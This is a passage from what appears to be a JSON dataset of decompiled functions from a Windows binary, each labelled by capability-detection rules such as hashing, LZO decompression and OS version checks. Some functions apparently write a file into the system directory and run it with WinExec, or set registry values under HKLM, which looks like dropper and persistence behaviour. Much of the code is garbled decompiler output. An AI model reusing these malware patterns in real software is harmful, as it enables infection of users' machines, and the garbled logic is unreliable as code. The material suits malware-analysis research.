arg_8h)[0x16] != 0) {\n        return in_EDX << 0x20;\n    }\n    uVar5 = 0x40;\n    if (0x80 < *(arg_8h + 0x1e)) {\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            uVar5 = *(arg_8h + 0x1e) - 0x80;\n        }\n        uVar10 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(uVar5);\n        puVar2 = uVar10;\n        bVar9 = (POPCOUNT(puVar2 & 0xff) & 1U) == 0;\n        if (puVar2 == NULL) {\n            return uVar10 & 0xffffffff00000000;\n        }\n        if ((!bVar9) && (bVar9)) {\n            puVar7 = segment(in_SS, *0x10 + -0x14);\n            uVar1 = *puVar7;\n            in_EDX = 0xb7bc9ea5;\n            if (bVar9) goto code_r0x0040200c;\n        }\n        uVar4 = 0;\n        if (uVar5 != 0) {\n            do {\n                iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n                uVar6 = uVar4 + 1;\n                *(uVar4 + puVar2) = iVar3 % 0xff;\n                uVar4 = uVar6;\n            } while (uVar6 < uVar5);\n        }\n        puVar7 = puVar2;\n        puVar8 = arg_8h + 0x40;\n        for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar2);\n        return CONCAT44(extraout_EDX, 1);\n    }\n    uVar1 = 0;\ncode_r0x0040200c:\n    return CONCAT44(in_EDX, uVar1);\n}\n",
        "token_count": 897
    },
    "00403660": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403660(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403510(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x41043c, acStack1304, &uStack2112);\n    uStack2088 = 0x4104f4;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x41050c;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402450(auStack1564, 0x410438, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1846
    },
    "004021f0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402251) overlaps instruction at (ram,0x0040224f)\n// \n// WARNING: Removing unreachable block (ram,0x00402251)\n\nuint __cdecl fcn.004021f0(uint lptstrFilename, uint s)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t unaff_BX;\n    uchar *puVar4;\n    uint16_t in_ES;\n    char cVar5;\n    bool bVar6;\n    char cVar7;\n    float10 fVar8;\n    uint uStack108;\n    uint uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint *puStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint var_16h;\n    uint var_12h;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint lpdwHandle;\n    \n    puStack44 = &fcn.004021f0::lpdwHandle;\n    uStack48 = lptstrFilename;\n    lpdwHandle = 0;\n    puStack52 = 0x40220b;\n    puVar1 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    if (puVar1 != NULL) {\n        uStack56 = 2;\n        puLen = 0;\n        uStack60 = 0x402221;\n        puStack52 = puVar1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        cVar7 = '\\0';\n        cVar5 = (uVar2 ^ unaff_BX) < 0;\n        uStack64 = 0x40222f;\n        uStack60 = uVar2;\n        uStack84 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        if ((cVar7 == cVar5) && (cVar7 != cVar5)) {\n            uStack60 = uStack60 & 0xffff0000 | in_ES;\n            uVar2 = uVar2 - 1;\n            puVar4 = puVar1 | &stack0xfffffffc;\n            puVar1 = puVar4 + 1;\n            *puVar4 = uStack84;\n        }\n        uStack64 = lpdwHandle;\n        uStack68 = lptstrFilename;\n        puStack72 = 0x40225b;\n        sub.VERSION.dll_GetFileVersionInfoA();\n        puStack72 = &fcn.004021f0::puLen;\n        puStack76 = &fcn.004021f0::lplpBuffer;\n        uStack80 = 0x410004;\n        uStack88 = 0x402288;\n        sub.VERSION.dll_VerQueryValueA();\n        uStack100 = *(lplpBuffer + 0x10) >> 0x10;\n        uStack88 = *(lplpBuffer + 0x14);\n        uStack92 = *(lplpBuffer + 0x14) >> 0x10;\n        uStack96 = *(lplpBuffer + 0x10);\n        uStack104 = 0x4104d8;\n        uStack108 = s;\n        iVar3 = (*_sym.imp.MSVCRT.dll_sprintf)();\n        bVar6 = &stack0xffffffac < 0;\n        if ((&stack0xffffff94 < 0xffffffe8) && (0xffffffe7 < &stack0xffffff94)) {\n            bVar6 = iVar3 < 0;\n        }\n        uStack92 = 0x4022fc;\n        uStack88 = uVar2;\n        fVar8 = (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n        if ((!bVar6) && (bVar6)) {\n            *(puVar1 + 0x1c) = fVar8;\n            uVar2 = uVar2 + 5;\n        }\n        uStack96 = 0x402314;\n        uStack92 = uVar2;\n        (*_sym.imp.KERNEL32.dll_GlobalFree)();\n    }\n    return 1;\n}\n",
        "token_count": 962
    },
    "00402680": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040274b) overlaps instruction at (ram,0x0040274a)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004026bd)\n\nulong fcn.00402680(uint param_1, uint *param_2, uint param_3, uint32_t *param_4)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint16_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    int32_t extraout_ECX;\n    uint32_t uVar9;\n    uint8_t extraout_DL;\n    uint extraout_EDX;\n    uchar *puVar10;\n    uint32_t uVar11;\n    uint unaff_EDI;\n    uint8_t in_AF;\n    bool bVar12;\n    char cVar13;\n    char cVar14;\n    ulong uVar15;\n    \n    puVar10 = &stack0xfffffffc;\n    uVar4 = fcn.00402500(0, param_1, param_2 + 1U >> 1);\n    uVar11 = uVar4;\n    cVar14 = '\\0';\n    cVar13 = '\\0';\n    bVar12 = uVar11 == 0;\n    uVar6 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar7 = uVar6;\n    if ((!bVar12 && cVar14 == cVar13) && (bVar12 || cVar14 != cVar13)) {\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        if (extraout_ECX == 0) {\n            puVar1 = (uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar6 + in_AF * '\\x06') & 0xff0f) + 0x56;\n            *puVar1 = *puVar1 | extraout_DL;\n            uVar5 = fcn.00401d50(param_1, unaff_EDI);\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar11);\n            return CONCAT44(extraout_EDX, uVar5);\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    do {\n        uVar2 = *(uVar6 + 0x58);\n        uVar8 = uVar2;\n        if (uVar8 <= uVar4) {\n            uVar11 = uVar11 - (uVar2 & 0xffff);\ncode_r0x0040273f:\n            bVar12 = (POPCOUNT(uVar11 & 0xff) & 1U) != 0;\n            if ((bVar12) && (!bVar12)) {\n                *(uVar11 + 0x3b) = *(uVar11 + 0x3b) + ((uVar7 << 0x10) >> 0x18) + (0x16 < uVar2);\n                pcVar3 = swi(1);\n                uVar15 = (*pcVar3)();\n                return uVar15;\n            }\n            uVar9 = uVar2 >> 0x10;\n            if (uVar11 < uVar2 >> 0x10) {\n                uVar11 = uVar11 - uVar9 & 0xffff;\n                bVar12 = SBORROW4(uVar11, 1);\n                uVar11 = uVar11 - 1;\n            }\n            else {\n                bVar12 = SBORROW4(uVar11, uVar9);\n                uVar11 = uVar11 - uVar9;\n            }\n            if ((bVar12) || (!bVar12)) {\n                bVar12 = CARRY4(uVar11, param_2);\n                uVar11 = uVar11 + param_2;\n            }\n            else {\n                param_4 = 0x458b5d21;\n                puVar10 = &stack0xfffffffb;\n                bVar12 = false;\n                param_2 = uVar7 & 0xffffff00 | 0x9e;\n                LOCK();\n            }\n            *param_4 = uVar11;\n            if ((bVar12) || (!bVar12)) {\n                param_2 = *(puVar10 + 0x10);\n            }\n            uVar6 = uVar6 ^ *(uVar6 + 0xe58be73);\n            uVar5 = *(uVar6 + 0x58);\n            *param_2 = uVar5;\n            return CONCAT44(uVar5, uVar6);\n        }\n        if ((uVar4 <= uVar8) || (uVar8 < uVar4)) {\n            uVar11 = (uVar11 - uVar2 & 0xffff) - 1;\n            goto code_r0x0040273f;\n        }\n        if (!SBORROW2(uVar4, uVar8)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        pcVar3 = swi(0x74);\n        uVar7 = (*pcVar3)();\n    } while( true );\n}\n",
        "token_count": 1174
    },
    "00402950": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint64_t fcn.00402950(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 151
    },
    "00402c40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d83) overlaps instruction at (ram,0x00402d80)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402bc3)\n\nuint32_t __fastcall fcn.00402c40(uint32_t param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint8_t uVar4;\n    uint32_t in_EAX;\n    char *pcVar5;\n    uint8_t *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint8_t uVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int32_t extraout_EDX;\n    uint8_t uVar13;\n    ushort uVar14;\n    uint uVar15;\n    uint unaff_EBX;\n    uint32_t uVar16;\n    uchar *puVar17;\n    int32_t unaff_ESI;\n    uint *puVar18;\n    int32_t unaff_EDI;\n    uint *puVar19;\n    uint *puVar20;\n    ushort in_SS;\n    bool bVar21;\n    bool bVar22;\n    uint8_t in_AF;\n    bool bVar23;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar24;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 in_ST0;\n    uchar auStack44 [40];\n    \n    bVar23 = false;\n    puVar17 = &stack0xfffffffc;\n    if ((&stack0xfffffffc < 0x28) || (SBORROW4(&stack0xfffffffc, 0x28) == auStack44 < 0)) {\n        bVar21 = false;\n        puVar6 = in_EAX & 0xae;\n    }\n    else {\n        *(in_EAX + 0x8316dbec) = in_ST0;\n        uVar4 = in_EAX - 1;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        uVar4 = uVar4 + in_AF * '\\x06';\n        *param_2 = *param_2 + -0x56af207c;\n        puVar17 = 0x2a00007c;\n        if (param_1 == 0) {\n            pe_dos_header =\n                 pe_dos_header +\n                 uVar4 + (0x90 < (uVar4 & 0xf0) | &stack0xfffffffc < 0x28 | in_AF * (0xf9 < uVar4)) * '`';\n            goto code_r0x00402c9a;\n        }\n        pcVar5 = in(param_2);\n        uVar4 = pcVar5 - *pcVar5;\n        puVar6 = pcVar5 & 0xffffff00 | uVar4;\n        puVar6[-0x51dab23c] = puVar6[-0x51dab23c] + uVar4;\n        bVar21 = CARRY1(*puVar6, uVar4);\n        *puVar6 = *puVar6 + uVar4;\n    }\n    bVar22 = (POPCOUNT(puVar6 - 1U & 0xff) & 1U) == 0;\n    if ((!bVar22) && (bVar22)) {\n        puVar3 = segment(in_SS, *0x10 + -0x38);\n        uVar7 = *puVar3;\n        uVar16 = &stack0xffffffc8 & 0xffff0000 | *0x10 - 0x34;\n        if (bVar21) {\n            *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e);\n            return uVar7;\n        }\n        if (bVar22) {\n            while( true ) {\n                bVar21 = uVar7 < param_1;\n                bVar24 = SBORROW4(uVar7, param_1);\n                uVar9 = uVar7 - param_1;\n                bVar22 = uVar9 == 0;\n                *(puVar17 + -8) = uVar7;\n                *(puVar17 + -0xc) = unaff_ESI;\n                if (param_1 <= uVar7) break;\n                if (!bVar22) {\n                    *(uVar16 - 4) = param_1;\n                    param_1 = *(uVar16 - 4);\n                    if (bVar22) {\n                        *(uVar16 - 4) =\n                             (in_NT & 1) * 0x4000 | bVar24 * 0x800 | bVar23 * 0x400 | (in_IF & 1) * 0x200 |\n                             (in_TF & 1) * 0x100 | (uVar9 < 0) * 0x80 | bVar22 * 0x40 | (in_AF & 1) * 0x10 |\n                             ((POPCOUNT(uVar9 & 0xff) & 1U) == 0) * 4 | bVar21 | (in_ID & 1) * 0x200000 |\n                             (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n                        uVar7 = *(uVar16 - 4);\n                        in_NT = (uVar7 & 0x4000) != 0;\n                        bVar23 = (uVar7 & 0x400) != 0;\n                        in_IF = (uVar7 & 0x200) != 0;\n                        in_TF = (uVar7 & 0x100) != 0;\n                        in_AF = (uVar7 & 0x10) != 0;\n                        in_ID = (uVar7 & 0x200000) != 0;\n                        in_AC = (uVar7 & 0x40000) != 0;\n                        in_VIP = 0;\n                        in_VIF = 0;\n                    }\n                }\n                iVar8 = *(puVar17 + 0x10);\n                uVar4 = *(*(puVar17 + -8) + iVar8);\n                puVar17[-1] = uVar4;\n                *(uVar16 - 4) = *(puVar17 + -8);\n                *(uVar16 - 8) = param_1 & 0xffffff00 | uVar4;\n                *(uVar16 - 0xc) = iVar8;\n                *(uVar16 - 0x10) = unaff_EBX;\n                *(uVar16 - 0x14) = uVar16;\n                *(uVar16 - 0x18) = puVar17;\n                *(uVar16 - 0x1c) = unaff_ESI;\n                *(uVar16 - 0x20) = unaff_EDI;\n                puVar17 = *(uVar16 - 0x18);\n                uVar9 = *(puVar17 + -0xc);\n                iVar2 = *(puVar17 + 0xc);\n                iVar8 = *(puVar17 + 8);\n                uVar4 = *(uVar9 % iVar2 + iVar8);\n                *(uVar16 - 4) = *(uVar16 - 0x10);\n                uVar15 = *(uVar16 - 4);\n                *(uVar16 - 4) = iVar8;\n                iVar8 = uVar9 - 1;\n                iVar12 = iVar8 % iVar2;\n                unaff_EDI = *(puVar17 + 8);\n                uVar10 = puVar17[-1];\n                uVar1 = *(iVar12 + unaff_EDI);\n                *(uVar16 - 4) = iVar12;\n                *(uVar16 - 6) = uVar15;\n                uVar14 = *(uVar16 - 6);\n                if ('\\0' < uVar15 >> 8) {\n                    *(uVar16 - 2) = uVar9;\n                    uVar9 = uVar9 & 0xffff0000 | *(uVar16 - 2);\n                }\n                uVar13 = puVar17[-0x10];\n                uVar10 = uVar13 ^ uVar10 ^ uVar1;\n                iVar12 = *(puVar17 + 0x18);\n                *(iVar12 + -1 + uVar9) = uVar10;\n                *(uVar16 - 4) = iVar8 / iVar2 & 0xffffff00U | uVar10;\n                iVar8 = *(puVar17 + -8);\n                uVar13 = uVar13 ^ uVar4;\n                unaff_EBX = CONCAT31(uVar15 >> 8 & 0xffff00 | uVar14 >> 8, uVar13);\n                param_1 = *(puVar17 + 0x14);\n                *(uVar9 + iVar12) = uVar13;\n                uVar7 = iVar8 + 1;\n                unaff_ESI = uVar9 + 2;\n            }\n            return uVar7;\n        }\n    }\ncode_r0x00402c9a:\n    iVar8 = fcn.00404500(*(puVar17 + 0x18), *(puVar17 + 0x1c), 0x41004c, 7);\n    *(puVar17 + -8) = iVar8;\n    if (iVar8 == 0) {\n        return 0;\n    }\n    puVar17[-0x28] = 0;\n    puVar19 = puVar17 + -0x27;\n    for (iVar8 = 7; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar19 = 0;\n        puVar19 = puVar19 + 1;\n    }\n    *puVar19 = 0;\n    *(puVar19 + 2) = 0;\n    *(puVar17 + -4) = 0;\n    do {\n        uVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n        uVar7 = uVar7 & 0x800000ff;\n        if (uVar7 < 0) {\n            uVar7 = (uVar7 - 1 | 0xffffff00) + 1;\n        }\n        iVar8 = *(puVar17 + -4);\n        puVar17[iVar8 + -0x28] = uVar7;\n        uVar9 = iVar8 + 1;\n        *(puVar17 + -4) = uVar9;\n    } while (uVar9 < 0x20);\n    puVar19 = *(puVar17 + -8);\n    puVar18 = puVar17 + -0x28;\n    puVar20 = puVar19;\n    for (iVar8 = 8; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar20 = *puVar18;\n        puVar18 = puVar18 + 1;\n        puVar20 = puVar20 + 1;\n    }\n    uVar11 = (uVar7 & 0xff00 | (uVar7 & 0x4e | 0x38) & puVar19) & puVar19 ^ 0x3c00;\n    uVar7 = (uVar11 & 0xff | (uVar11 >> 8) + (unaff_EBX >> 8) << 8) | 0x604;\n    bVar23 = (uVar7 >> 8) + uVar7 == '\\0';\n    uVar4 = fcn.00404860(*(puVar17 + 8), *(puVar17 + 0xc), *(puVar17 + 0x10), *(puVar17 + 0x14), puVar17 + -0x28, 0x20, \n                         puVar19);\n    if ((bVar23) || (iVar8 = extraout_EDX,  !bVar23)) {\n        iVar8 = *(puVar17 + 0x1c);\n        uVar4 = *(puVar17 + 0x18);\n    }\n    *(iVar8 + 0x50) = (*(iVar8 + 0x50) - iVar8) - (uVar4 < 0x8b);\n    fcn.004027d0(0x47);\n    return 1;\n}\n",
        "token_count": 2793
    },
    "00402da0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e10) overlaps instruction at (ram,0x00402e0d)\n// \n// WARNING: Removing unreachable block (ram,0x00402e04)\n\nuint __cdecl fcn.00402da0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    puVar6 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_164h = '\\0';\n    puVar6 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    (*pcVar2)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar7 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar7 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_20h = ~uVar4 - 1;\n    var_38h = 0x4100c4;\n    var_34h = 0x4100d0;\n    var_30h = 0x4100dc;\n    var_2ch = 0x4100ec;\n    var_28h = 0x4100f4;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    uVar4 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    if (*(uVar4 - 0x10) < 5) {\n        uVar5 = *(uVar4 - 0x10) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, uVar4 - 0x268, *((uVar4 - 0x38) + uVar5));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1122
    },
    "00403860": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ea1) overlaps instruction at (ram,0x00403ea0)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00403860(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint16_t extraout_CX;\n    char *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    char extraout_CH;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint8_t extraout_CH_00;\n    uint extraout_ECX_07;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    int16_t extraout_DX_02;\n    ushort extraout_DX_03;\n    char *pcVar7;\n    uint extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint32_t unaff_EBX;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint16_t uVar16;\n    int32_t unaff_ESI;\n    uint *puVar17;\n    uint8_t *unaff_EDI;\n    uint32_t uVar18;\n    uint *puVar19;\n    bool bVar20;\n    uchar uVar21;\n    uint8_t in_AF;\n    uchar uVar22;\n    bool bVar23;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar24;\n    ulong uVar25;\n    unkbyte6 Var26;\n    uint in_stack_ffffffc8;\n    uint uVar27;\n    uint 